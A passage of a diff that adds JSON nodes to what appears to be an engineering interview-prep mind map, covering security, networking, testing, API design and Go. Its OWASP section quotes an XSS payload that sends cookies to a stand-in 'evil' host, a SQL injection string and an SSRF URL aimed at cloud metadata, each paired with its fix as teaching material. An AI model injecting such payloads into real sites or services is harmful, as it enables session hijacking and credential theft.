@@ -1140,6 +1140,744 @@
           ]
         }
       ]
+    },
+    {
+      "title": "Security",
+      "note": "Defending the system across the auth, network, data, code, and operational planes.",
+      "children": [
+        {
+          "title": "Authentication",
+          "note": "Proving **who** the caller is.",
+          "children": [
+            {
+              "title": "Sessions (cookie-based)",
+              "children": [
+                {
+                  "title": "**Definition:** Stateful auth where the server stores a session record and hands the client an opaque session ID inside an HTTP-only cookie.<br/>**Trade-offs:** Trivial to revoke (delete the row) and naturally CSRF-protected with `SameSite=Lax`, but every API node needs access to the session store, which becomes a hot dependency.<br/>**Application Example:** A monolithic web app keeping sessions in Redis with a 24-hour TTL; signing out drops the key and the next request 401s."
+                }
+              ]
+            },
+            {
+              "title": "JWT (stateless tokens)",
+              "children": [
+                {
+                  "title": "**Definition:** Self-contained signed JSON token (`header.payload.signature`) carrying the user's identity and claims; verified via signature without hitting a session store.<br/>**Trade-offs:** Stateless and great for microservices, but **revocation is hard** — you can't \"log out\" until the token expires, which forces short TTLs and refresh tokens.<br/>**Application Example:** An API gateway validating an RS256-signed access token in `Authorization: Bearer …` on every call without a DB lookup."
+                }
+              ]
+            },
+            {
+              "title": "OAuth 2.0 / OIDC",
+              "children": [
+                {
+                  "title": "**Definition:** OAuth 2.0 is a delegated **authorization** framework; OpenID Connect (OIDC) layers **identity** (an `id_token`) on top.<br/>**Trade-offs:** Standardised flows (authorization code + PKCE for SPAs/mobile, client credentials for service-to-service), but the spec is broad and easy to mis-implement — the wrong flow leaks tokens.<br/>**Application Example:** \"Sign in with Google\" using OIDC's authorization code + PKCE flow, returning an `id_token` plus an `access_token` for downstream APIs."
+                }
+              ]
+            },
+            {
+              "title": "API keys",
+              "children": [
+                {
+                  "title": "**Definition:** Long-lived static secrets a client sends in a header (e.g. `X-API-Key`) to identify itself.<br/>**Trade-offs:** Dead-simple to issue and rotate, but easy to leak (logs, repos, screenshots) and offer no user identity — only \"this caller knows the secret\".<br/>**Application Example:** A SaaS platform issuing per-tenant API keys for backend integrations, scoped to a project and revocable from a dashboard."
+                }
+              ]
+            },
+            {
+              "title": "Multi-factor authentication (TOTP, WebAuthn / passkeys)",
+              "children": [
+                {
+                  "title": "**Definition:** Require a second factor beyond the password — something the user **has** (TOTP app, security key) or **is** (biometric).<br/>**Trade-offs:** Dramatically reduces phishing/credential-stuffing risk, but adds friction and recovery flows to design carefully.<br/>**Application Example:** GitHub requiring a TOTP code or WebAuthn passkey on every new device login for accounts contributing to popular open-source repos."
+                }
+              ]
+            },
+            {
+              "title": "Single Sign-On (SAML, OIDC)",
+              "children": [
+                {
+                  "title": "**Definition:** Enterprise-grade auth where a central Identity Provider (Okta, Azure AD, Google) issues assertions/tokens to multiple downstream apps.<br/>**Trade-offs:** One login across many tools and centralised offboarding, but adds an integration tax and hard-couples uptime to the IdP.<br/>**Application Example:** An employee logging into Slack, Notion, and Datadog via Okta SAML — disabling the user in Okta cuts access everywhere."
+                }
+              ]
+            },
+            {
+              "title": "Password storage (bcrypt, argon2, scrypt)",
+              "children": [
+                {
+                  "title": "**Definition:** Store an **adaptive** hash (bcrypt / argon2 / scrypt) of the password, not the password itself; cost is tuned so a verify takes ~100ms.<br/>**Trade-offs:** Resilient to GPU/ASIC cracking even after a DB leak, at the cost of CPU/memory per login — must tune work factor per hardware.<br/>**Application Example:** User signup runs `argon2id(password, salt, t=3, m=64MB, p=1)` and stores the encoded hash; login re-runs the same parameters to compare."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Authorization",
+          "note": "Deciding **what** the caller is allowed to do.",
+          "children": [
+            {
+              "title": "RBAC",
+              "children": [
+                {
+                  "title": "**Definition:** Role-Based Access Control — assign users to **roles** (admin, editor, viewer) and grant permissions to roles.<br/>**Trade-offs:** Easy to reason about and audit at small scale, but explodes (\"role explosion\") when permissions need to vary by resource, owner, or attribute.<br/>**Application Example:** A SaaS app where `admin` can create projects, `editor` can write within their project, and `viewer` can only read — defined in a permissions table per role."
+                }
+              ]
+            },
+            {
+              "title": "ABAC",
+              "children": [
+                {
+                  "title": "**Definition:** Attribute-Based Access Control — decisions evaluate **attributes** of the user, resource, action, and environment via policies.<br/>**Trade-offs:** Far more expressive than RBAC and avoids role explosion, but harder to reason about and audit — \"who can do X?\" is no longer a simple lookup.<br/>**Application Example:** A policy: `allow if user.department == resource.department AND time.hour BETWEEN 9 AND 18`, evaluated by an OPA sidecar on each request."
+                }
+              ]
+            },
+            {
+              "title": "ReBAC (Zanzibar-style)",
+              "children": [
+                {
+                  "title": "**Definition:** Relationship-Based Access Control — model permissions as graphs of relationships (`user X is owner of folder Y`, `folder Y is parent of file Z`).<br/>**Trade-offs:** Naturally fits social/document/folder hierarchies and scales to billions of relationships, but needs a dedicated service and careful schema design.<br/>**Application Example:** Google Drive sharing modeled in Zanzibar: \"can_view(file)\" walks `editor` → `parent_folder` → `editor` relationships transitively."
+                }
+              ]
+            },
+            {
+              "title": "Policy engines (OPA, Cedar)",
+              "children": [
+                {
+                  "title": "**Definition:** Externalised decision engines that take `(subject, action, resource, context)` and return allow/deny based on declarative policies.<br/>**Trade-offs:** Decouple policy from code so policies can be reviewed and updated independently, but add a network hop and a new component to operate.<br/>**Application Example:** An Envoy sidecar consulting OPA on every gRPC call against a Rego policy bundle versioned in Git and pushed via OCI registry."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Server-to-server auth",
+          "note": "Identity for non-human callers — cron jobs, services, scripts, deploy pipelines.",
+          "children": [
+            {
+              "title": "mTLS",
+              "children": [
+                {
+                  "title": "**Definition:** Mutual TLS — both client AND server present X.509 certificates so each side cryptographically authenticates the other.<br/>**Trade-offs:** Strongest form of pinned identity for service-to-service traffic and impossible to phish, but requires cert lifecycle automation (issuance, rotation, revocation).<br/>**Application Example:** Service-mesh sidecars (Istio, Linkerd) automatically issuing short-lived per-pod certs from an internal CA so all in-cluster traffic is mTLS-encrypted and -authenticated."
+                }
+              ]
+            },
+            {
+              "title": "OAuth client credentials",
+              "children": [
+                {
+                  "title": "**Definition:** OAuth 2.0 flow for backend-to-backend auth: the client exchanges a `client_id`/`client_secret` for a short-lived access token.<br/>**Trade-offs:** Standardised, scope-aware, and integrates with existing IdPs, but secret distribution is your problem and short tokens require frequent refreshes.<br/>**Application Example:** A nightly batch job fetching an access token from Auth0 with `grant_type=client_credentials` and using it to call an internal API."
+                }
+              ]
+            },
+            {
+              "title": "Service accounts (K8s SA, AWS IAM roles, GCP service accounts)",
+              "children": [
+                {
+                  "title": "**Definition:** Cloud/platform-native identities attached to a workload — the platform mints short-lived credentials transparently, no static secrets.<br/>**Trade-offs:** Eliminates credential leakage (no secrets to steal) and inherits IAM auditing, but ties the workload tightly to the platform.<br/>**Application Example:** A pod with `serviceAccountName: orders-app` getting an IRSA token that lets it `s3:GetObject` on one specific bucket, without any AWS keys in code or env."
+                }
+              ]
+            },
+            {
+              "title": "SSH public-key authentication",
+              "children": [
+                {
+                  "title": "**Definition:** Asymmetric auth where a server stores the user's public key and accepts logins signed with the matching private key.<br/>**Trade-offs:** Phishing-proof and easy to revoke (delete the key from `authorized_keys`), but a leaked private key without a passphrase is full compromise.<br/>**Application Example:** Engineers SSH'ing into bastion hosts using ed25519 keys whose public part is provisioned via configuration management; passwords are disabled."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Encryption",
+          "note": "Protect data in motion and at rest.",
+          "children": [
+            {
+              "title": "In transit (TLS / mTLS)",
+              "children": [
+                {
+                  "title": "**Definition:** Encrypts data while it travels over the network, defending against passive sniffing and active tampering.<br/>**Trade-offs:** Universal and battle-tested, but cert lifecycle is its own operational discipline and TLS termination location matters (LB vs. pod).<br/>**Application Example:** An Application Load Balancer terminating TLS with an ACM cert at the edge and re-encrypting to pods over mTLS via the service mesh."
+                }
+              ]
+            },
+            {
+              "title": "At rest (KMS, envelope encryption)",
+              "children": [
+                {
+                  "title": "**Definition:** Encrypts data while it sits on disk; the data key encrypts data, and a Key Management Service (KMS) wraps the data key.<br/>**Trade-offs:** Centralises key custody and audit (KMS logs every use), but performance depends on caching the unwrapped key and key rotation needs careful design.<br/>**Application Example:** An S3 bucket with SSE-KMS encryption: each object has a unique data key wrapped by `arn:aws:kms:…:keys/…`, decrypt-on-fetch by IAM-authorised callers."
+                }
+              ]
+            },
+            {
+              "title": "Symmetric vs asymmetric",
+              "children": [
+                {
+                  "title": "**Definition:** **Symmetric:** one shared key used for both encrypt and decrypt (AES). **Asymmetric:** a key pair where the public key encrypts and only the private key decrypts (RSA, ECC).<br/>**Trade-offs:** Symmetric is fast but key distribution is the problem; asymmetric solves distribution but is ~1000× slower — real systems combine both.<br/>**Application Example:** TLS handshake uses asymmetric (RSA/ECDHE) to negotiate a shared symmetric session key (AES-GCM), then encrypts the bulk traffic with the symmetric key."
+                }
+              ]
+            },
+            {
+              "title": "Hashing vs encryption",
+              "children": [
+                {
+                  "title": "**Definition:** **Hashing** is a one-way function producing a fixed-length fingerprint; **encryption** is reversible with the right key.<br/>**Trade-offs:** Hashes can't be undone — perfect for password verification and integrity checks; encryption is for confidentiality of data you'll need back.<br/>**Application Example:** Storing `argon2id(password)` in the DB (hash) but encrypting users' API keys with KMS (encrypt) so the support team can re-display them."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Secrets management",
+          "note": "Where credentials live and how they get into the workload that needs them.",
+          "children": [
+            {
+              "title": "Vault / AWS Secrets Manager / Doppler",
+              "children": [
+                {
+                  "title": "**Definition:** Centralised stores that issue, version, and audit secrets; apps fetch them at runtime instead of reading from env vars or files.<br/>**Trade-offs:** One auditable place for credentials with fine-grained access, but the secrets store becomes a Tier-0 dependency that must be HA.<br/>**Application Example:** A microservice authenticating to Vault via its K8s service account and fetching a database password that rotates every 24 hours."
+                }
+              ]
+            },
+            {
+              "title": "Rotation",
+              "children": [
+                {
+                  "title": "**Definition:** Periodically replacing credentials so a leaked secret has a short useful life.<br/>**Trade-offs:** Drastically shrinks the blast radius of a leak, but rotation must be automated end-to-end — manual rotation creates outages and gets skipped.<br/>**Application Example:** AWS RDS IAM-database authentication issuing 15-minute tokens, or Vault's database secrets engine creating per-app DB users with TTLs."
+                }
+              ]
+            },
+            {
+              "title": "OIDC federation in CI",
+              "children": [
+                {
+                  "title": "**Definition:** CI runners (GitHub Actions, GitLab) mint a short-lived OIDC token at job start; cloud providers exchange it for temporary IAM credentials based on a trust relationship.<br/>**Trade-offs:** Eliminates long-lived static keys in CI (no more `AWS_SECRET_ACCESS_KEY` repo secret), but requires correct trust-policy setup per repo/branch.<br/>**Application Example:** A GitHub Actions deploy job using `aws-actions/configure-aws-credentials` with `role-to-assume` and trust policy gating on `repo:org/repo:ref:refs/heads/main`."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "OWASP Top 10",
+          "note": "The application-level vulnerability classes every senior engineer should recognise on sight.",
+          "children": [
+            {
+              "title": "Injection (SQL / command / LDAP)",
+              "children": [
+                {
+                  "title": "**Definition:** Untrusted input concatenated into a query/command and executed by the interpreter (DB, shell, LDAP server).<br/>**Trade-offs:** Catastrophic when exploited (full DB read/write or RCE), but trivially preventable with parameterised queries and input validation.<br/>**Application Example:** `SELECT * FROM users WHERE id = '${id}'` allowing `' OR 1=1 --`; the fix is `?`-parameterised queries via the driver."
+                }
+              ]
+            },
+            {
+              "title": "Broken authentication",
+              "children": [
+                {
+                  "title": "**Definition:** Flaws in login, session, or credential handling — predictable session IDs, password reset abuse, missing rate limits, no MFA.<br/>**Trade-offs:** Often invisible until exploited and devastating because it grants account-level access; mitigated by adopting battle-tested IdPs over rolling your own.<br/>**Application Example:** An app that returns 200 OK for valid users and 404 for unknown users on `POST /login`, allowing username enumeration before brute-force."
+                }
+              ]
+            },
+            {
+              "title": "XSS",
+              "children": [
+                {
+                  "title": "**Definition:** Cross-Site Scripting — attacker-supplied input rendered into a victim's browser as executable JS, hijacking session/UI in their context.<br/>**Trade-offs:** Common in template/HTML output and dangerous because it bypasses same-origin protections, but a strict CSP + framework auto-escaping kills 99% of cases.<br/>**Application Example:** A comment field saving `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` and rendering it raw on the page; the fix is contextual escaping + `Content-Security-Policy: script-src 'self'`."
+                }
+              ]
+            },
+            {
+              "title": "CSRF",
+              "children": [
+                {
+                  "title": "**Definition:** Cross-Site Request Forgery — a malicious site causes a logged-in user's browser to issue authenticated state-changing requests to your app.<br/>**Trade-offs:** Devastating for cookie-auth apps, neutralised by `SameSite=Lax/Strict` cookies plus an anti-CSRF token on state-changing endpoints.<br/>**Application Example:** An attacker page submitting `<form action=https://bank.com/transfer method=POST>`; the bank rejects the request because the session cookie is `SameSite=Strict`."
+                }
+              ]
+            },
+            {
+              "title": "SSRF",
+              "children": [
+                {
+                  "title": "**Definition:** Server-Side Request Forgery — the server is tricked into making outbound requests to attacker-chosen URLs (often internal: `169.254.169.254` cloud metadata).<br/>**Trade-offs:** High-impact in cloud environments because metadata endpoints leak credentials, but mitigated by allow-listing outbound destinations and blocking link-local IPs.<br/>**Application Example:** An image-resize service fetching `?url=http://169.254.169.254/…` and returning IMDS-stolen IAM credentials; the fix is a strict outbound URL allow-list and IMDSv2."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "title": "Threat modeling",
+          "note": "Structured way to enumerate threats before they become incidents.",
+          "children": [
+            {
+              "title": "STRIDE",
+              "children": [
+                {
+                  "title": "**Definition:** Acronym for **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of service, **E**levation of privilege — a checklist of threat categories per data-flow boundary.<br/>**Trade-offs:** Forces a systematic look at trust boundaries early in design, but only as good as the model — high-level architectures miss low-level bugs.<br/>**Application Example:** A whiteboard data-flow diagram of a checkout flow with each arrow annotated with applicable STRIDE categories and corresponding mitigations."
+                }
+              ]
+            },
+            {
+              "title": "Attack surface analysis",
+              "children": [
+                {
+                  "title": "**Definition:** Enumerate every place an attacker could interact with the system — endpoints, ports, dependencies, supply chain — and quantify risk.<br/>**Trade-offs:** Drives prioritisation (\"reduce surface\" → fewer exposed endpoints), but the surface drifts every deploy so the analysis must be continuous.<br/>**Application Example:** An ASM tool inventorying all external-facing endpoints across cloud accounts weekly and flagging newly-exposed admin panels or unauthenticated services."
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Networking fundamentals",
+      "note": "The TCP/IP stack you have to be fluent in to design distributed systems.",
+      "children": [
+        {
+          "title": "DNS",
+          "children": [
+            {
+              "title": "**Definition:** Distributed name-resolution system mapping human-readable names (`api.example.com`) to IPs and other records (MX, TXT, SRV).<br/>**Trade-offs:** Hierarchical and aggressively cached for low-latency lookups, but TTLs make changes propagate slowly and DNS is a notorious source of subtle outages.<br/>**Application Example:** A multi-region deployment using Route 53 latency-based routing to send each user's `api.example.com` query to the nearest healthy regional ALB, with a 60-second TTL."
+            }
+          ]
+        },
+        {
+          "title": "TCP / UDP",
+          "children": [
+            {
+              "title": "**Definition:** **TCP:** reliable, ordered, connection-oriented stream with congestion control; **UDP:** best-effort, unordered, connectionless datagrams.<br/>**Trade-offs:** TCP is the default for correctness, but its retransmits and head-of-line blocking are bad for real-time and bursty traffic — UDP wins when you'd rather drop than wait.<br/>**Application Example:** HTTP/1.1 and HTTP/2 ride TCP; HTTP/3, QUIC, DNS, and most VoIP/video conferencing ride UDP for the latency win."
+            }
+          ]
+        },
+        {
+          "title": "TLS",
+          "children": [
+            {
+              "title": "**Definition:** Transport Layer Security — encrypted, authenticated channel over TCP using certificates and a session-key handshake.<br/>**Trade-offs:** Defends against passive sniffing and active MITM, but cert lifecycle and protocol versions are a constant source of operational pain.<br/>**Application Example:** A modern web service serving HTTPS using TLS 1.3 (one-RTT handshake), an ECDSA cert from Let's Encrypt rotated by `cert-manager`, and ALPN-negotiated HTTP/2."
+            }
+          ]
+        },
+        {
+          "title": "HTTP versions",
+          "children": [
+            {
+              "title": "**Definition:** **HTTP/1.1:** plain-text, one request per connection; **HTTP/2:** binary, multiplexed over one TCP connection (HPACK header compression); **HTTP/3:** HTTP/2 semantics over QUIC (UDP).<br/>**Trade-offs:** Each version trades complexity for fewer round-trips and better head-of-line behaviour — HTTP/3 finally fixes TCP HoL blocking but isn't supported everywhere.<br/>**Application Example:** An API serving HTTP/2 between LB and origin (multiplexed gRPC), with HTTP/3 enabled at the edge for clients on mobile networks where QUIC's recovery is fastest."
+            }
+          ]
+        },
+        {
+          "title": "Real-time protocols",
+          "children": [
+            {
+              "title": "**Definition:** Bidirectional or push-style protocols for live data: **WebSockets** (full-duplex over TCP), **SSE** (server-push over HTTP), **long-polling** (held-open HTTP request), **WebRTC** (P2P audio/video/data over UDP).<br/>**Trade-offs:** Each fits a different latency/complexity sweet spot — WebSockets for chat and collaboration, SSE for one-way streams (notifications), WebRTC for media.<br/>**Application Example:** A collaborative editor using WebSockets for cursor positions and edits, SSE for low-priority notifications, and WebRTC for an in-app video call between collaborators."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Testing strategies",
+      "note": "Layered confidence — fast cheap tests for most code, slow expensive tests for the riskiest paths.",
+      "children": [
+        {
+          "title": "Test pyramid",
+          "children": [
+            {
+              "title": "**Definition:** Cohn's hierarchy: lots of fast unit tests → fewer integration tests → very few end-to-end tests, with cost and flakiness rising as you go up.<br/>**Trade-offs:** Optimises feedback time by catching most bugs at the cheapest layer, but only works if the layers below are actually exercising the right behaviour.<br/>**Application Example:** A microservice with 5,000 unit tests (run in 8s), 200 integration tests against a real Postgres in CI (3 min), and 20 critical-path e2e tests on a staging URL (10 min)."
+            }
+          ]
+        },
+        {
+          "title": "Unit tests",
+          "children": [
+            {
+              "title": "**Definition:** Tests one function/class in isolation, mocking or stubbing collaborators.<br/>**Trade-offs:** Fast and pinpoint failures, but heavy mocking can lock the test to the implementation and hide refactoring opportunities.<br/>**Application Example:** A `formatCurrency(amount, locale)` test asserting outputs for 12 locale combinations, finishing in milliseconds with no I/O."
+            }
+          ]
+        },
+        {
+          "title": "Integration tests",
+          "children": [
+            {
+              "title": "**Definition:** Tests several real components together — service + DB, service + queue — with as little mocking as possible.<br/>**Trade-offs:** Catches contract mismatches and SQL/migration bugs that unit tests miss, at the cost of slower runs and more flake from environment setup.<br/>**Application Example:** Spinning up Postgres via Testcontainers and running the order-creation HTTP handler against the real schema, asserting both response and resulting rows."
+            }
+          ]
+        },
+        {
+          "title": "Contract tests",
+          "children": [
+            {
+              "title": "**Definition:** Consumer-driven contracts where the client publishes its expectations as a contract and the provider verifies against it in CI.<br/>**Trade-offs:** Catches breaking API changes before deploy without a flaky e2e environment, but requires both teams to adopt the tooling and discipline.<br/>**Application Example:** Pact: the `web` consumer publishes its expected `/orders` contract; the `orders-service` CI replays it and fails the build if the response shape regresses."
+            }
+          ]
+        },
+        {
+          "title": "End-to-end tests",
+          "children": [
+            {
+              "title": "**Definition:** Drive the full stack — real browser, real backend, real DB — to verify user flows.<br/>**Trade-offs:** The closest test to actual user experience, but slow, flaky, and expensive to maintain — keep the suite small and focused on critical paths.<br/>**Application Example:** A Playwright test running on a staging URL that signs up, creates a project, invites a teammate, and asserts the welcome email arrives."
+            }
+          ]
+        },
+        {
+          "title": "Load testing",
+          "children": [
+            {
+              "title": "**Definition:** Synthetic-traffic generation that exercises the system at expected and peak load to measure latency, throughput, and saturation points.<br/>**Trade-offs:** Surfaces capacity limits and bottlenecks before users do, but realistic load scenarios (think distributions, not RPS averages) are hard to design.<br/>**Application Example:** A k6 script ramping to 5,000 RPS with realistic user-journey distributions, run pre-Black-Friday against a production-sized staging environment."
+            }
+          ]
+        },
+        {
+          "title": "Chaos engineering",
+          "children": [
+            {
+              "title": "**Definition:** Deliberately inject faults — kill pods, drop packets, throttle CPU — in production-like environments to verify the system survives.<br/>**Trade-offs:** Builds genuine confidence in resilience, but requires solid observability and a culture that tolerates the surprises chaos uncovers.<br/>**Application Example:** Netflix Chaos Monkey randomly terminating EC2 instances during business hours; Gremlin / Litmus injecting CPU/network faults into K8s clusters on a schedule."
+            }
+          ]
+        },
+        {
+          "title": "Test doubles",
+          "children": [
+            {
+              "title": "**Definition:** Stand-ins for real collaborators in tests: **mock** (verifies calls), **stub** (returns canned responses), **fake** (working in-memory implementation), **spy** (records calls).<br/>**Trade-offs:** Critical for fast deterministic tests, but overuse couples tests to implementation — refactors go red despite behaviour being unchanged.<br/>**Application Example:** Replacing the SMTP client with a fake that records every send-attempt in memory; the test asserts a `WelcomeEmail` was queued without touching real email infrastructure."
+            }
+          ]
+        },
+        {
+          "title": "Property-based testing",
+          "children": [
+            {
+              "title": "**Definition:** Frameworks generate random inputs and shrink failing cases; you assert **invariants** (\"output is always sorted\", \"encode→decode is identity\") instead of fixed examples.<br/>**Trade-offs:** Finds bugs example-based tests miss (edge cases at type boundaries), but requires expressing invariants — not always obvious for business logic.<br/>**Application Example:** Hypothesis (Python) or fast-check (TS) generating arbitrary lists and asserting `sorted(reverse(sorted(xs))) == sorted(xs)` to find subtle comparator bugs."
+            }
+          ]
+        },
+        {
+          "title": "Mutation testing",
+          "children": [
+            {
+              "title": "**Definition:** A tool mutates the production code (flips `>` to `<`, removes statements) and re-runs the test suite; surviving mutants reveal **gaps** in the tests.<br/>**Trade-offs:** Measures test **quality**, not just coverage, but slow (re-runs the suite hundreds of times) and noisy (some mutants are equivalent).<br/>**Application Example:** Stryker (JS/TS) running once per release in CI; surviving mutants in the payment-engine module trigger a quality-gate failure until tests are tightened."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "API design",
+      "note": "Designing public-facing surfaces that survive years of clients and change.",
+      "children": [
+        {
+          "title": "REST maturity (Richardson Model)",
+          "children": [
+            {
+              "title": "**Definition:** Four-level model: **L0** RPC over HTTP, **L1** resources, **L2** HTTP verbs/status codes, **L3** hypermedia (HATEOAS).<br/>**Trade-offs:** Higher levels are more discoverable and cacheable, but most production APIs sit at L2 — L3 adoption is rare in practice.<br/>**Application Example:** A REST API exposing `/orders/{id}` (resource), using `POST /orders` and `GET /orders/{id}` correctly with `201 Created` and `Location` headers (L2)."
+            }
+          ]
+        },
+        {
+          "title": "Versioning",
+          "children": [
+            {
+              "title": "**Definition:** Strategy for evolving an API without breaking existing clients — URL path (`/v1/`), header (`Accept: application/vnd.api.v2+json`), or content negotiation.<br/>**Trade-offs:** URL versioning is most discoverable and trivial to route; header versioning keeps URLs stable but is invisible to caches and humans.<br/>**Application Example:** Stripe pinning each merchant to a versioned API release and rolling out new versions with full changelogs and migration guides."
+            }
+          ]
+        },
+        {
+          "title": "Idempotency keys",
+          "children": [
+            {
+              "title": "**Definition:** Client-supplied unique key (header `Idempotency-Key`) that the server uses to deduplicate retried writes.<br/>**Trade-offs:** Makes at-least-once delivery safe, but the server must persist the key + response for some retention window — extra storage and deduplication logic.<br/>**Application Example:** `POST /payments` with `Idempotency-Key: 8a7…` so a network blip during checkout doesn't double-charge the customer; the server returns the original response on retry."
+            }
+          ]
+        },
+        {
+          "title": "Pagination",
+          "children": [
+            {
+              "title": "**Definition:** **Offset:** `?page=2&size=50`; **cursor/keyset:** `?after=ulid…&size=50`; **limit/offset on indexed columns** as a middle ground.<br/>**Trade-offs:** Offset is intuitive but breaks at large offsets (slow scans, items shifting); cursor/keyset is stable and fast but harder to jump to arbitrary pages.<br/>**Application Example:** A timeline endpoint paginating with `?after_id=…&limit=50` so newly-inserted items don't shift older items into duplicated/skipped pages."
+            }
+          ]
+        },
+        {
+          "title": "Error contracts",
+          "children": [
+            {
+              "title": "**Definition:** Structured error responses, ideally **RFC 7807 Problem Details** — `type`, `title`, `status`, `detail`, `instance` — instead of free-form strings.<br/>**Trade-offs:** Lets clients reliably handle errors and translate them, but only valuable if the team disciplines itself to use the same structure everywhere.<br/>**Application Example:** Returning `application/problem+json` with `{ \"type\": \"...\", \"title\": \"Insufficient funds\", \"status\": 422, \"balance\": 0.50 }` from a payments API."
+            }
+          ]
+        },
+        {
+          "title": "Rate-limit headers",
+          "children": [
+            {
+              "title": "**Definition:** Standard response headers (`X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`) plus `Retry-After` on `429`.<br/>**Trade-offs:** Lets well-behaved clients self-throttle without retry storms, but headers are advisory — the server must still enforce.<br/>**Application Example:** An API returning `429 Too Many Requests` with `Retry-After: 30` and `X-RateLimit-Reset: 1714…`; SDKs back off automatically using these headers."
+            }
+          ]
+        },
+        {
+          "title": "HATEOAS",
+          "children": [
+            {
+              "title": "**Definition:** Hypermedia As The Engine Of Application State — responses embed links describing what actions the client can take next.<br/>**Trade-offs:** Self-describing and theoretically decouples client from URLs, but adoption is rare because most clients hard-code routes anyway.<br/>**Application Example:** An order response embedding `{ \"_links\": { \"cancel\": { \"href\": \"/orders/123/cancel\" }, \"refund\": { \"href\": \"…\" } } }` so clients only follow links they're authorised for."
+            }
+          ]
+        },
+        {
+          "title": "Schema-first",
+          "children": [
+            {
+              "title": "**Definition:** Define the wire contract in a schema (OpenAPI for REST, Protobuf for gRPC) and generate clients/servers/docs from it.<br/>**Trade-offs:** Single source of truth for the API and codegen across many languages, at the cost of a schema-as-code workflow that some teams find heavy.<br/>**Application Example:** An internal API defined in `.proto` files, generating Go and TypeScript clients via `buf generate`; SDK changes are driven by schema PRs."
+            }
+          ]
+        },
+        {
+          "title": "Backward compatibility",
+          "children": [
+            {
+              "title": "**Definition:** Evolve the API by **adding** never **removing** — new optional fields, parallel endpoints, deprecation periods.<br/>**Trade-offs:** Lets old clients keep working while new clients adopt new shapes; the cost is supporting more variants and a discipline of additive change.<br/>**Application Example:** Adding `currency` as an optional field on a `Money` object with a default; older clients ignore it, newer clients require it — old responses still parse."
+            }
+          ]
+        },
+        {
+          "title": "API Gateway integration",
+          "children": [
+            {
+              "title": "**Definition:** Cross-cutting concerns — auth, rate-limit, routing, request shaping — handled at a single edge component instead of in every service.<br/>**Trade-offs:** Centralises a lot of policy and shields services from clients, but is itself a critical hop and can fragment if every team owns its own gateway.<br/>**Application Example:** Kong / AWS API Gateway terminating TLS, validating JWTs, and routing `/orders/*` to the orders service — services receive only authenticated, rate-limited traffic."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "title": "Golang",
+      "note": "Senior-level Go interview classics — concurrency, the runtime, idioms, and the famous gotchas.",
+      "children": [
+        {
+          "title": "Concurrency (goroutines, channels, select)",
+          "children": [
+            {
+              "title": "**Definition:** Lightweight user-space threads (goroutines) communicating via typed pipes (channels), composed with `select` for fan-in/timeouts. \"Don't communicate by sharing memory; share memory by communicating.\"<br/>**Trade-offs:** Cheap to spawn (10s of thousands routine) and easy to reason about per-goroutine, but easy to leak goroutines or deadlock on unbuffered channels.<br/>**Application Example:** A worker pool: producer → buffered channel → N consumer goroutines, all cancellable through a shared `context.Context` passed via a `select` arm."
+            }
+          ]
+        },
+        {
+          "title": "Memory model & race detector",
+          "children": [
+            {
+              "title": "**Definition:** Go's memory model defines a `happens-before` relationship; without explicit synchronisation, reads can see stale writes. The `-race` flag instruments code to detect concurrent access.<br/>**Trade-offs:** Race detector catches the worst class of concurrency bugs in test, but adds 5-10× CPU overhead and only flags races that actually fire.<br/>**Application Example:** `go test -race ./…` in CI for every PR, plus `go run -race` on staging during a soak test to surface intermittent races before prod."
+            }
+          ]
+        },
+        {
+          "title": "GC & escape analysis",
+          "children": [
+            {
+              "title": "**Definition:** Go has a concurrent, tri-color, mark-sweep GC tuned for low pause times (sub-millisecond). The compiler's escape analysis decides whether a value lives on the stack or heap.<br/>**Trade-offs:** Generally invisible and great for productivity, but heap allocations add GC pressure — high-throughput services use `sync.Pool` and watch `go tool pprof` to keep allocations low.<br/>**Application Example:** `go build -gcflags='-m'` to see what escapes to the heap; using `bytes.Buffer` from `sync.Pool` in a hot HTTP handler to avoid per-request allocation."
+            }
+          ]
+        },
+        {
+          "title": "Interfaces & composition",
+          "children": [
+            {
+              "title": "**Definition:** Interfaces are satisfied **structurally** (no `implements` keyword); composition via embedding replaces inheritance.<br/>**Trade-offs:** Tiny interfaces (`io.Reader`, `error`) compose cleanly across the ecosystem, but accidental satisfaction can surprise — and \"interface bloat\" near the call site is a smell.<br/>**Application Example:** `func process(r io.Reader) error` accepting any `Read`-er — files, network, in-memory buffers — without knowing or caring about the concrete type."
+            }
+          ]
+        },
+        {
+          "title": "Error handling (errors.Is / As / wrapping with %w)",
+          "children": [
+            {
+              "title": "**Definition:** Errors are explicit return values. Wrap with `fmt.Errorf(\"…: %w\", err)`; introspect with `errors.Is(err, target)` and `errors.As(err, &target)` for typed checks.<br/>**Trade-offs:** Forces caller awareness at every boundary (no surprise exceptions), but verbose and easy to lose context if you don't wrap.<br/>**Application Example:** `if errors.Is(err, sql.ErrNoRows) { return notFound() }` after wrapping the original DB error with operation context up the stack."
+            }
+          ]
+        },
+        {
+          "title": "Context propagation (cancellation, timeouts, request-scoped values)",
+          "children": [
+            {
+              "title": "**Definition:** `context.Context` flows as the **first parameter** through every blocking call, carrying cancellation, deadlines, and request-scoped values.<br/>**Trade-offs:** Universal cancellation across goroutines and clean timeout semantics, at the cost of `context.Context` polluting nearly every signature.<br/>**Application Example:** An HTTP handler creating `ctx, cancel := context.WithTimeout(r.Context(), 2*time.Second)` and passing `ctx` to DB and downstream calls so they all abort if the client disconnects."
+            }
+          ]
+        },
+        {
+          "title": "Testing (table-driven, benchmarks, fuzz)",
+          "children": [
+            {
